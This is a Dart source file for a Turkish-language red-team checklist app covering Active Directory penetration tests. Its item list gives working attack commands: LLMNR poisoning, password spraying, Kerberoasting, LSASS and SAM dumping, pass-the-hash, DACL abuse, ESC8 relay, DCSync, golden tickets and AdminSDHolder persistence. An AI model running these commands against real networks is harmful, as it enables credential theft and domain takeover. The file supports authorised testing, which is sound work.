enum ChecklistStatus {
  pending,    // Henüz yapılmadı (Gri)
  completed,  // Başarılı / Zafiyet Bulundu (Yeşil)
  failed,     // Denendi / Sonuç Alınamadı / Koruma Var (Kırmızı)
  na,         // Kapsam Dışı / Uygulanamaz (Sarı)
}

class ChecklistItem {
  final String id;
  final String phaseId;
  final String phaseTitle;
  final String title;
  final String description;
  final String? recommendedTool;
  final String? exampleCommand;
  final String? docPath;
  final String? mitreTechnique;
  final String opsecLevel; // 'Düşük (Sessiz)', 'Orta', 'Yüksek (Gürültülü)'

  const ChecklistItem({
    required this.id,
    required this.phaseId,
    required this.phaseTitle,
    required this.title,
    required this.description,
    this.recommendedTool,
    this.exampleCommand,
    this.docPath,
    this.mitreTechnique,
    required this.opsecLevel,
  });
}

class ChecklistProfile {
  final String id;
  String name;
  String targetDomain;
  String targetDcIp;
  final DateTime createdAt;
  Map<String, String> itemStatuses; // itemId -> 'completed', 'failed', 'na', 'pending'
  Map<String, String> itemNotes;    // itemId -> user notes

  ChecklistProfile({
    required this.id,
    required this.name,
    required this.targetDomain,
    required this.targetDcIp,
    required this.createdAt,
    Map<String, String>? itemStatuses,
    Map<String, String>? itemNotes,
  })  : itemStatuses = itemStatuses ?? {},
        itemNotes = itemNotes ?? {};

  ChecklistStatus getStatus(String itemId) {
    final s = itemStatuses[itemId];
    switch (s) {
      case 'completed':
        return ChecklistStatus.completed;
      case 'failed':
        return ChecklistStatus.failed;
      case 'na':
        return ChecklistStatus.na;
      default:
        return ChecklistStatus.pending;
    }
  }

  void setStatus(String itemId, ChecklistStatus status) {
    if (status == ChecklistStatus.pending) {
      itemStatuses.remove(itemId);
    } else {
      itemStatuses[itemId] = status.name;
    }
  }

  String getNote(String itemId) => itemNotes[itemId] ?? '';

  void setNote(String itemId, String note) {
    if (note.trim().isEmpty) {
      itemNotes.remove(itemId);
    } else {
      itemNotes[itemId] = note.trim();
    }
  }

  Map<String, dynamic> toJson() => {
        'id': id,
        'name': name,
        'targetDomain': targetDomain,
        'targetDcIp': targetDcIp,
        'createdAt': createdAt.toIso8601String(),
        'itemStatuses': itemStatuses,
        'itemNotes': itemNotes,
      };

  factory ChecklistProfile.fromJson(Map<String, dynamic> json) => ChecklistProfile(
        id: json['id'] as String? ?? 'prof_${DateTime.now().millisecondsSinceEpoch}',
        name: json['name'] as String? ?? 'Varsayılan Operasyon',
        targetDomain: json['targetDomain'] as String? ?? 'corp.local',
        targetDcIp: json['targetDcIp'] as String? ?? '192.168.1.10',
        createdAt: DateTime.tryParse(json['createdAt'] as String? ?? '') ?? DateTime.now(),
        itemStatuses: (json['itemStatuses'] as Map<String, dynamic>? ?? {})
            .map((k, v) => MapEntry(k, v.toString())),
        itemNotes: (json['itemNotes'] as Map<String, dynamic>? ?? {})
            .map((k, v) => MapEntry(k, v.toString())),
      );
}

const List<ChecklistItem> kDefaultChecklistItems = [
  // ==========================================
  // --- FAZ 1: KEŞİF VE PASİF İSTİHBARAT ---
  // ==========================================
  ChecklistItem(
    id: 'chk_f1_dns_srv',
    phaseId: 'phase_1',
    phaseTitle: 'Faz 1: Keşif & Pasif İstihbarat',
    title: 'Domain Controller ve Kerberos SRV Kayıtlarının Tespiti',
    description: 'Etki alanındaki tüm Domain Controller, KDC, Global Catalog ve LDAP sunucu IP adreslerini DNS SRV kayıtları üzerinden haritalandırın.',
    recommendedTool: 'nslookup / dig',
    exampleCommand: 'nslookup -type=srv _ldap._tcp.dc._msdcs.corp.local',
    docPath: '3-Red_Team/Modul_01_Kesif_ve_Numaralandirma/README.md',
    mitreTechnique: 'T1590.005',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f1_ldap_anonymous',
    phaseId: 'phase_1',
    phaseTitle: 'Faz 1: Keşif & Pasif İstihbarat',
    title: 'Anonim LDAP / Null Base Sorgulama',
    description: 'Domain Controller üzerinde kimlik doğrulamasız (Anonymous/Null bind) RootDSE ve temel isimlendirme bağlamı (Naming Contexts) sorgusu yapın.',
    recommendedTool: 'ldapsearch / nmap',
    exampleCommand: 'ldapsearch -x -H ldap://192.168.1.10 -s base namingcontexts',
    docPath: '3-Red_Team/Modul_01_Kesif_ve_Numaralandirma/01.1_LDAP_Enumerasyonu.md',
    mitreTechnique: 'T1087.002',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f1_smb_anon_null',
    phaseId: 'phase_1',
    phaseTitle: 'Faz 1: Keşif & Pasif İstihbarat',
    title: 'SMB Null / Guest Oturumu ve Paylaşım Taraması',
    description: 'SMB portu (445) üzerinden boş (null) kullanıcı veya Guest oturumu ile erişilebilir açık paylaşımları (IPC\$, SYSVOL vb.) tespit edin.',
    recommendedTool: 'NetExec (nxc) / smbclient',
    exampleCommand: 'nxc smb 192.168.1.0/24 -u "" -p "" --shares',
    docPath: '3-Red_Team/Modul_11_Arac_Ustaligi_ve_Komut_Notlari/Kategori_01_Temel_Istemciler_ve_Ag_Protokolleri/smbclient.md',
    mitreTechnique: 'T1135',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f1_smb_signing',
    phaseId: 'phase_1',
    phaseTitle: 'Faz 1: Keşif & Pasif İstihbarat',
    title: 'SMB Signing (İmzalama) Durumunun Haritalanması',
    description: 'Ağdaki hangi sunucularda SMB Signing "disabled/not required" olduğunu tespit ederek NTLM Relay potansiyeli olan hedefleri belirleyin.',
    recommendedTool: 'NetExec / nmap',
    exampleCommand: 'nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt',
    docPath: '3-Red_Team/Modul_08_Koersiyon_ve_NTLM_Relay/08.1_NTLM_Relay_Senaryolari.md',
    mitreTechnique: 'T1557.001',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f1_web_interfaces',
    phaseId: 'phase_1',
    phaseTitle: 'Faz 1: Keşif & Pasif İstihbarat',
    title: 'AD CS HTTP Kayıt ve Web Arayüzlerinin Tespiti',
    description: 'Etki alanındaki AD CS web kayıt noktalarını (/certsrv), ADFS, OWA veya dahili web portallarını tespit edin.',
    recommendedTool: 'curl / certipy / httpx',
    exampleCommand: 'certipy find -vulnerable -u "" -p "" -dc-ip 192.168.1.10',
    docPath: '3-Red_Team/Modul_07_AD_CS_PKI_Saldirilari/07.1_ESC1_ESC8_Somuru_Teknikleri.md',
    mitreTechnique: 'T1595.002',
    opsecLevel: 'Düşük (Sessiz)',
  ),

  // ==========================================
  // --- FAZ 2: NUMARALANDIRMA (ENUMERATION) ---
  // ==========================================
  ChecklistItem(
    id: 'chk_f2_bloodhound',
    phaseId: 'phase_2',
    phaseTitle: 'Faz 2: Aktif Numaralandırma',
    title: 'BloodHound / SharpHound ile İlişki Grafiği Çıkarımı',
    description: 'Tüm kullanıcı, grup, ACL, GPO, oturum ve etki alanı güven sınırlarını toplayarak Domain Admin\'e giden en kısa saldırı yollarını analiz edin.',
    recommendedTool: 'SharpHound / bloodhound-python',
    exampleCommand: 'bloodhound-python -u user -p pass -d corp.local -dc dc01.corp.local -c All',
    docPath: '3-Red_Team/Modul_01_Kesif_ve_Numaralandirma/01.2_SharpHound_ve_BloodHound.md',
    mitreTechnique: 'T1087.002',
    opsecLevel: 'Orta',
  ),
  ChecklistItem(
    id: 'chk_f2_spn_accounts',
    phaseId: 'phase_2',
    phaseTitle: 'Faz 2: Aktif Numaralandırma',
    title: 'SPN Tanımlı Servis Hesaplarının Tespiti',
    description: 'Service Principal Name (SPN) atanmış kullanıcı hesaplarını listeleyin (Kerberoasting potansiyeli analizi).',
    recommendedTool: 'GetUserSPNs.py / PowerView',
    exampleCommand: 'python3 GetUserSPNs.py corp.local/user:pass -dc-ip 192.168.1.10 -request',
    docPath: '3-Red_Team/Modul_03_Kimlik_Bilgisi_Erisimi/03.1_Kerberoasting_ve_AS_REP_Roasting.md',
    mitreTechnique: 'T1558.003',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f2_asrep_accounts',
    phaseId: 'phase_2',
    phaseTitle: 'Faz 2: Aktif Numaralandırma',
    title: 'Pre-Authentication Kapalı Hesapların Tespiti (DONT_REQ_PREAUTH)',
    description: 'userAccountControl özniteliğinde Kerberos ön-kimlik doğrulaması kapatılmış kullanıcıları sorgulayın.',
    recommendedTool: 'GetNPUsers.py / Rubeus',
    exampleCommand: 'python3 GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -format hashcat',
    docPath: '3-Red_Team/Modul_03_Kimlik_Bilgisi_Erisimi/03.1_Kerberoasting_ve_AS_REP_Roasting.md',
    mitreTechnique: 'T1558.004',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f2_laps_audit',
    phaseId: 'phase_2',
    phaseTitle: 'Faz 2: Aktif Numaralandırma',
    title: 'LAPS Dağıtımı ve Parola Okuma Haklarının Denetimi',
    description: 'Ağda LAPS veya Windows LAPS kullanımını kontrol edin; ms-Mcs-AdmPwd veya msLAPS-Password özniteliklerini okuma hakkına sahip kullanıcıları inceleyin.',
    recommendedTool: 'NetExec / pyLAPS / PowerView',
    exampleCommand: 'nxc ldap 192.168.1.10 -u user -p pass --laps',
    docPath: '3-Red_Team/Modul_03_Kimlik_Bilgisi_Erisimi/03.3_DPAPI_ve_Credential_Vault.md',
    mitreTechnique: 'T1003.003',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f2_snaffler_shares',
    phaseId: 'phase_2',
    phaseTitle: 'Faz 2: Aktif Numaralandırma',
    title: 'Hassas Dosya ve Parola Avı (Snaffler)',
    description: 'Erişilebilir dosya paylaşımlarında web.config, unattend.xml, id_rsa, id_dsa, .kdbx ve parola içeren notları tarayın.',
    recommendedTool: 'Snaffler / smbmap',
    exampleCommand: '.\\Snaffler.exe -s -d corp.local -o snaffler_loot.txt',
    docPath: '3-Red_Team/Modul_11_Arac_Ustaligi_ve_Komut_Notlari/Kategori_10_Kurumsal_Altyapi_Paylasim_ve_Veri_Avi/Snaffler.md',
    mitreTechnique: 'T1083',
    opsecLevel: 'Orta',
  ),
  ChecklistItem(
    id: 'chk_f2_trusts',
    phaseId: 'phase_2',
    phaseTitle: 'Faz 2: Aktif Numaralandırma',
    title: 'Forest ve Domain Güven İlişkilerinin (Trusts) İncelenmesi',
    description: 'Etki alanları arasındaki tek/çift yönlü güven ilişkilerini, transitive durumunu ve SID Filtering ayarlarını haritalandırın.',
    recommendedTool: 'PowerView / nltest',
    exampleCommand: 'nltest /domain_trusts',
    docPath: '3-Red_Team/Modul_10_Trust_Forest_ve_Hibrit_Saldirilar/10.1_SID_History_Injection.md',
    mitreTechnique: 'T1482',
    opsecLevel: 'Düşük (Sessiz)',
  ),

  // ==========================================
  // --- FAZ 3: İLK ERİŞİM & PAROLA SALDIRILARI ---
  // ==========================================
  ChecklistItem(
    id: 'chk_f3_poisoning',
    phaseId: 'phase_3',
    phaseTitle: 'Faz 3: İlk Erişim & Parola Saldırıları',
    title: 'LLMNR / NBT-NS / mDNS Zehirleme (Responder)',
    description: 'Yerel ağdaki geçersiz isim çözümleme isteklerini sahte sunucuyla yanıtlayarak istemcilerin NetNTLMv2 hash\'lerini yakalayın.',
    recommendedTool: 'Responder',
    exampleCommand: 'sudo responder -I eth0 -dwv',
    docPath: '3-Red_Team/Modul_02_Ilk_Erisim_ve_Yerlesme/02.1_LLMNR_NBTNS_mDNS_Poisoning.md',
    mitreTechnique: 'T1557.001',
    opsecLevel: 'Yüksek (Gürültülü)',
  ),
  ChecklistItem(
    id: 'chk_f3_password_spray',
    phaseId: 'phase_3',
    phaseTitle: 'Faz 3: İlk Erişim & Parola Saldırıları',
    title: 'Politika Uyumlu Güvenli Password Spraying',
    description: 'Domain hesap kilitleme eşiğini (Account Lockout Threshold) kontrol ederek mevsimlik parolalarla (örn: Spring2024!, Welcome123!) tek turlu deneme yapın.',
    recommendedTool: 'NetExec / Kerbrute',
    exampleCommand: 'nxc smb 192.168.1.10 -u users.txt -p "Winter2024!" --continue-on-success',
    docPath: '3-Red_Team/Modul_02_Ilk_Erisim_ve_Yerlesme/02.2_Password_Spraying.md',
    mitreTechnique: 'T1110.003',
    opsecLevel: 'Orta',
  ),
  ChecklistItem(
    id: 'chk_f3_kerbrute_enum',
    phaseId: 'phase_3',
    phaseTitle: 'Faz 3: İlk Erişim & Parola Saldırıları',
    title: 'Kerbrute ile Ön-Yetkisiz Kullanıcı Tespiti',
    description: 'Kerberos Pre-Auth istekleri göndererek loglarda Event ID 4625 üretmeden geçerli kullanıcı adlarını tespit edin.',
    recommendedTool: 'Kerbrute',
    exampleCommand: './kerbrute userenum -d corp.local --dc 192.168.1.10 users.txt',
    docPath: '3-Red_Team/Modul_11_Arac_Ustaligi_ve_Komut_Notlari/Kategori_03_Dizin_Kesfi_Graf_Analizi_ve_Haritalama/Kerbrute.md',
    mitreTechnique: 'T1087.002',
    opsecLevel: 'Düşük (Sessiz)',
  ),

  // ==========================================
  // --- FAZ 4: KİMLİK BİLGİSİ VE BİLET TOPLAMA ---
  // ==========================================
  ChecklistItem(
    id: 'chk_f4_kerberoasting',
    phaseId: 'phase_4',
    phaseTitle: 'Faz 4: Kimlik Bilgisi & Bilet Toplama',
    title: 'Kerberoasting ile TGS Hash\'lerinin Çekilmesi',
    description: 'SPN hesapları için RC4 downgrade (0x17) TGS biletleri talep edin ve Hashcat mod 13100 ile çevrimdışı kırma dosyasına dökün.',
    recommendedTool: 'Rubeus / GetUserSPNs.py',
    exampleCommand: 'Rubeus.exe kerberoast /nowrap /format:hashcat',
    docPath: '3-Red_Team/Modul_03_Kimlik_Bilgisi_Erisimi/03.1_Kerberoasting_ve_AS_REP_Roasting.md',
    mitreTechnique: 'T1558.003',
    opsecLevel: 'Orta',
  ),
  ChecklistItem(
    id: 'chk_f4_asreproasting',
    phaseId: 'phase_4',
    phaseTitle: 'Faz 4: Kimlik Bilgisi & Bilet Toplama',
    title: 'AS-REP Roasting ile TGT Şifre Çözümü',
    description: 'Pre-auth kapalı kullanıcılar için AS-REP paketlerini talep edin ve Hashcat mod 18200 formatında kaydedin.',
    recommendedTool: 'Rubeus / GetNPUsers.py',
    exampleCommand: 'Rubeus.exe asreproast /format:hashcat /nowrap',
    docPath: '3-Red_Team/Modul_03_Kimlik_Bilgisi_Erisimi/03.1_Kerberoasting_ve_AS_REP_Roasting.md',
    mitreTechnique: 'T1558.004',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f4_lsass_dump',
    phaseId: 'phase_4',
    phaseTitle: 'Faz 4: Kimlik Bilgisi & Bilet Toplama',
    title: 'LSASS Bellek Dökümü ve Kimlik Bilgisi Hasadı',
    description: 'Yerel yönetici olunan iş istasyonunda lsass.exe sürecinden oturum açmış kullanıcıların NTLM hash ve Kerberos biletlerini çıkarın.',
    recommendedTool: 'Mimikatz / comsvcs.dll / Nanodump',
    exampleCommand: 'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump <PID> dump.dmp full',
    docPath: '3-Red_Team/Modul_03_Kimlik_Bilgisi_Erisimi/03.2_LSASS_Bellek_Dokumu.md',
    mitreTechnique: 'T1003.001',
    opsecLevel: 'Yüksek (Gürültülü)',
  ),
  ChecklistItem(
    id: 'chk_f4_sam_system_dump',
    phaseId: 'phase_4',
    phaseTitle: 'Faz 4: Kimlik Bilgisi & Bilet Toplama',
    title: 'Yerel SAM ve SYSTEM Hive\'larının Dökümlenmesi',
    description: 'Uç noktalardaki yerel Administrator hash\'lerini almak için SAM ve SYSTEM kayıt defteri hive\'larını dışa aktarın.',
    recommendedTool: 'reg.exe / secretsdump.py',
    exampleCommand: 'reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM sys.save',
    docPath: '3-Red_Team/Modul_03_Kimlik_Bilgisi_Erisimi/03.2_LSASS_Bellek_Dokumu.md',
    mitreTechnique: 'T1003.002',
    opsecLevel: 'Orta',
  ),

  // ==========================================
  // --- FAZ 5: YANAL HAREKET (LATERAL MOVEMENT) ---
  // ==========================================
  ChecklistItem(
    id: 'chk_f5_pth',
    phaseId: 'phase_5',
    phaseTitle: 'Faz 5: Yanal Hareket & Uzak Yürütme',
    title: 'Pass-the-Hash (PtH) ile SMB / WMI / WinRM Geçişi',
    description: 'Parola çözmeye gerek kalmadan elde edilen NTLM hash\'i ile hedef makinelerde kimlik doğrulayıp komut çalıştırın.',
    recommendedTool: 'wmiexec.py / evil-winrm / NetExec',
    exampleCommand: 'python3 wmiexec.py -hashes :<NTLM_HASH> corp.local/admin@192.168.1.50',
    docPath: '3-Red_Team/Modul_04_Yanal_Hareket/04.1_Pass_the_Hash_ve_Overpass_the_Hash.md',
    mitreTechnique: 'T1550.002',
    opsecLevel: 'Orta',
  ),
  ChecklistItem(
    id: 'chk_f5_overpass_pth',
    phaseId: 'phase_5',
    phaseTitle: 'Faz 5: Yanal Hareket & Uzak Yürütme',
    title: 'Overpass-the-Hash (Pass-the-Key) ile TGT Edinimi',
    description: 'Kullanıcının NTLM veya AES anahtarını KDC\'ye sunarak meşru bir Kerberos TGT bileti üretip oturuma enjekte edin.',
    recommendedTool: 'Rubeus / Mimikatz',
    exampleCommand: 'Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> /ptt',
    docPath: '3-Red_Team/Modul_04_Yanal_Hareket/04.1_Pass_the_Hash_ve_Overpass_the_Hash.md',
    mitreTechnique: 'T1550.002',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f5_ptt',
    phaseId: 'phase_5',
    phaseTitle: 'Faz 5: Yanal Hareket & Uzak Yürütme',
    title: 'Pass-the-Ticket (PtT) ile Bilet Enjeksiyonu',
    description: 'Çalınan veya sahte üretilen Kerberos biletlerini (.kirbi / .ccache) bellek önbelleğine yükleyerek hedef servislere erişin.',
    recommendedTool: 'Rubeus / Mimikatz',
    exampleCommand: 'Rubeus.exe ptt /ticket:ticket.kirbi',
    docPath: '3-Red_Team/Modul_04_Yanal_Hareket/04.2_Pass_the_Ticket.md',
    mitreTechnique: 'T1550.003',
    opsecLevel: 'Düşük (Sessiz)',
  ),

  // ==========================================
  // --- FAZ 6: YETKİ YÜKSELTMESİ & DELEGASYON ---
  // ==========================================
  ChecklistItem(
    id: 'chk_f6_dacl_abuse',
    phaseId: 'phase_6',
    phaseTitle: 'Faz 6: Yetki Yükseltme & Delegasyon',
    title: 'Tehlikeli DACL Haklarının Sömürülmesi (GenericAll, WriteDacl)',
    description: 'Yüksek yetkili gruplar veya kullanıcılar üzerinde GenericAll, WriteDacl, WriteOwner haklarını tespit edip grup üyeliği ekleyin veya parola sıfırlayın.',
    recommendedTool: 'BloodyAD / PowerView',
    exampleCommand: 'bloodyAD -u user -p pass -d corp.local --host 192.168.1.10 add groupMember "Domain Admins" user',
    docPath: '3-Red_Team/Modul_05_Yetki_Yukseltme_ACL_ve_GPO/05.1_DACL_Abuse.md',
    mitreTechnique: 'T1078.002',
    opsecLevel: 'Orta',
  ),
  ChecklistItem(
    id: 'chk_f6_shadow_creds',
    phaseId: 'phase_6',
    phaseTitle: 'Faz 6: Yetki Yükseltme & Delegasyon',
    title: 'Shadow Credentials Saldırısı (msDS-KeyCredentialLink)',
    description: 'Hedef nesnede WriteProperty hakkı varsa, yeni X.509 anahtarı enjekte edip PKINIT üzerinden parola değiştirmeden TGT talep edin.',
    recommendedTool: 'pywhisker / Certipy',
    exampleCommand: 'pywhisker.py -d corp.local -u user -p pass --target target_user --action add',
    docPath: '3-Red_Team/Modul_05_Yetki_Yukseltme_ACL_ve_GPO/05.4_Shadow_Credentials.md',
    mitreTechnique: 'T1556',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f6_rbcd',
    phaseId: 'phase_6',
    phaseTitle: 'Faz 6: Yetki Yükseltme & Delegasyon',
    title: 'Resource-Based Constrained Delegation (RBCD) Saldırısı',
    description: 'Hedef bilgisayarın msDS-AllowedToActOnBehalfOfOtherIdentity özniteliğine kontrol edilen bir makine hesabı yazarak S4U2 kimliğe bürünme gerçekleştirin.',
    recommendedTool: 'Impacket rbcd.py / Rubeus',
    exampleCommand: 'python3 rbcd.py -delegate-to TARGET_PC\$ -delegate-from FAKE_PC\$ -action write corp.local/user:pass',
    docPath: '3-Red_Team/Modul_06_Kerberos_Delegation_Saldirilari/06.3_Resource_Based_Constrained_Delegation.md',
    mitreTechnique: 'T1558',
    opsecLevel: 'Orta',
  ),
  ChecklistItem(
    id: 'chk_f6_adcs_esc1',
    phaseId: 'phase_6',
    phaseTitle: 'Faz 6: Yetki Yükseltme & Delegasyon',
    title: 'AD CS ESC1 / ESC2 / ESC3 Şablon Sömürüsü',
    description: 'ENROLLEE_SUPPLIES_SUBJECT bayrağı açık şablonlardan Domain Administrator adına sertifika talep edip PKINIT ile TGT alın.',
    recommendedTool: 'Certipy',
    exampleCommand: 'certipy req -u user@corp.local -p pass -ca CORP-CA -template ESC1_Template -upn administrator@corp.local',
    docPath: '3-Red_Team/Modul_07_AD_CS_PKI_Saldirilari/07.1_ESC1_ESC8_Somuru_Teknikleri.md',
    mitreTechnique: 'T1649',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f6_adcs_esc8',
    phaseId: 'phase_6',
    phaseTitle: 'Faz 6: Yetki Yükseltme & Delegasyon',
    title: 'AD CS ESC8 (HTTP /certsrv NTLM Relay) Sömürüsü',
    description: 'Domain Controller makine hesabını PetitPotam ile zorlayıp NTLM kimlik doğrulamasını HTTP CA kayıt servisine relay ederek DC sertifikası alın.',
    recommendedTool: 'Coercer / ntlmrelayx / Certipy',
    exampleCommand: 'ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController',
    docPath: '3-Red_Team/Modul_07_AD_CS_PKI_Saldirilari/07.1_ESC1_ESC8_Somuru_Teknikleri.md',
    mitreTechnique: 'T1187',
    opsecLevel: 'Yüksek (Gürültülü)',
  ),

  // ==========================================
  // --- FAZ 7: ETKİ ALANI HÂKİMİYETİ & KALICILIK ---
  // ==========================================
  ChecklistItem(
    id: 'chk_f7_dcsync',
    phaseId: 'phase_7',
    phaseTitle: 'Faz 7: Etki Alanı Hâkimiyeti & Kalıcılık',
    title: 'DCSync ile KRBTGT ve Administrator Hash\'lerinin Çıkarılması',
    description: 'DRSUAPI protokolünü kullanarak etki alanındaki tüm kullanıcıların parola hash\'lerini ve Kerberos anahtarlarını dökümleyin.',
    recommendedTool: 'secretsdump.py / Mimikatz',
    exampleCommand: 'python3 secretsdump.py -just-dc-ntds corp.local/admin:pass@192.168.1.10',
    docPath: '3-Red_Team/Modul_09_Domain_Hakimiyeti_ve_Kalicilik/09.1_DCSync_ile_Hash_Cikarma.md',
    mitreTechnique: 'T1003.006',
    opsecLevel: 'Orta',
  ),
  ChecklistItem(
    id: 'chk_f7_golden_ticket',
    phaseId: 'phase_7',
    phaseTitle: 'Faz 7: Etki Alanı Hâkimiyeti & Kalıcılık',
    title: 'Golden Ticket Oluşturma ve Test Etme',
    description: 'KRBTGT NTLM veya AES-256 anahtarı ile sahte bir TGT bileti oluşturarak etki alanında 10 yıl geçerli sınırsız erişim sağlayın.',
    recommendedTool: 'Mimikatz / ticketer.py / Rubeus',
    exampleCommand: 'mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21... /krbtgt:<HASH> /ptt',
    docPath: '3-Red_Team/Modul_09_Domain_Hakimiyeti_ve_Kalicilik/09.2_Golden_Silver_Diamond_Sapphire_Ticket.md',
    mitreTechnique: 'T1558.001',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f7_silver_ticket',
    phaseId: 'phase_7',
    phaseTitle: 'Faz 7: Etki Alanı Hâkimiyeti & Kalıcılık',
    title: 'Silver Ticket ile Servis Seviyesinde Kalıcılık',
    description: 'KDC ile iletişim kurmadan doğrudan hedef makine hesabı hash\'i ile CIFS veya HTTP servisi için sahte TGS bileti oluşturun.',
    recommendedTool: 'Mimikatz / ticketer.py',
    exampleCommand: 'python3 ticketer.py -nthash <TARGET_HASH> -domain-sid S-1-5-21... -spn cifs/target.corp.local Administrator',
    docPath: '3-Red_Team/Modul_09_Domain_Hakimiyeti_ve_Kalicilik/09.2_Golden_Silver_Diamond_Sapphire_Ticket.md',
    mitreTechnique: 'T1558.002',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f7_adminsdholder',
    phaseId: 'phase_7',
    phaseTitle: 'Faz 7: Etki Alanı Hâkimiyeti & Kalıcılık',
    title: 'AdminSDHolder / SDProp Kalıcılık Mekanizması',
    description: 'AdminSDHolder nesnesine gizli bir kullanıcı için GenericAll yetkisi ekleyerek SDProp\'un bu yetkiyi tüm korumalı gruplara kopyalamasını sağlayın.',
    recommendedTool: 'PowerView / Add-DomainObjectAcl',
    exampleCommand: 'Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity attacker -Rights All',
    docPath: '3-Red_Team/Modul_09_Domain_Hakimiyeti_ve_Kalicilik/09.3_AdminSDHolder_DCShadow_DSRM.md',
    mitreTechnique: 'T1098',
    opsecLevel: 'Orta',
  ),

  // ==========================================
  // --- FAZ 8: ORMANLAR ARASI VE TEMİZLİK ---
  // ==========================================
  ChecklistItem(
    id: 'chk_f8_sid_history',
    phaseId: 'phase_8',
    phaseTitle: 'Faz 8: Ormanlar Arası & Temizlik',
    title: 'SID History Enjeksiyonu ile Trust Atlaması',
    description: 'SID Filtering kapalı olan iki yönlü trust ilişkilerinde, bilet içine ana ormanın Enterprise Admins (519) SID\'sini ekleyin.',
    recommendedTool: 'Mimikatz / Rubeus',
    exampleCommand: 'Rubeus.exe golden /user:Administrator /domain:child.corp.local /sid:S-1-5-21... /sids:S-1-5-21...-519 /ptt',
    docPath: '3-Red_Team/Modul_10_Trust_Forest_ve_Hibrit_Saldirilar/10.1_SID_History_Injection.md',
    mitreTechnique: 'T1134.005',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f8_cleanup_accounts',
    phaseId: 'phase_8',
    phaseTitle: 'Faz 8: Ormanlar Arası & Temizlik',
    title: 'Sızma Testi Sonrası Hesap ve Artefakt Temizliği',
    description: 'Operasyon süresince eklenen sahte makine hesapları (Fake PC\$), eklenen grup üyelikleri ve msDS-KeyCredentialLink anahtarlarını silin.',
    recommendedTool: 'PowerShell / ActiveDirectory Modülü',
    exampleCommand: 'Remove-ADComputer -Identity "FAKE_PC" -Confirm:\$false',
    docPath: '3-Red_Team/Modul_10_Trust_Forest_ve_Hibrit_Saldirilar/10.4_Savunma_Atlatma_AMSI_ETW_OPSEC.md',
    mitreTechnique: 'T1070',
    opsecLevel: 'Düşük (Sessiz)',
  ),
  ChecklistItem(
    id: 'chk_f8_ioc_report',
    phaseId: 'phase_8',
    phaseTitle: 'Faz 8: Ormanlar Arası & Temizlik',
    title: 'IOC ve Operasyonel Denetim Raporunun Çıkarılması',
    description: 'Test boyunca kullanılan kaynak IP\'ler, tetiklenen Event ID\'ler ve tespit edilen kritik bulguları müşteri raporu için özetleyin.',
    recommendedTool: 'Active Directory Vault Report Generator',
    exampleCommand: 'Raporu Dışa Aktar (Export Report)',
    docPath: '3-Red_Team/PLAYBOOK.md',
    mitreTechnique: 'T1592',
    opsecLevel: 'Düşük (Sessiz)',
  ),
];
